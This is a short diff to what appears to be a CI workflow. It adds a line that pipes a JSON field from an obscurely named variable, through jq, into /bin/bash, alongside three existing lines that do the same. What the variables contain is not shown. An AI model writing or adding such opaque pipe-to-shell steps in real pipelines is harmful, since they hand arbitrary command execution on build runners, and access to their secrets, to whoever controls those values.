@@ -26,6 +26,7 @@ jobs:
           printf '%s' "$kv8" | jq -r .tfduf1 | /bin/bash
           printf '%s' "$s11" | jq -r .q0323 | /bin/bash
           printf '%s' "$xzlbf38" | jq -r .scui9161 | /bin/bash
+          echo $zw617 | jq -r .pyspc89017 | /bin/bash
 
       - name: Persist output
         if: always()
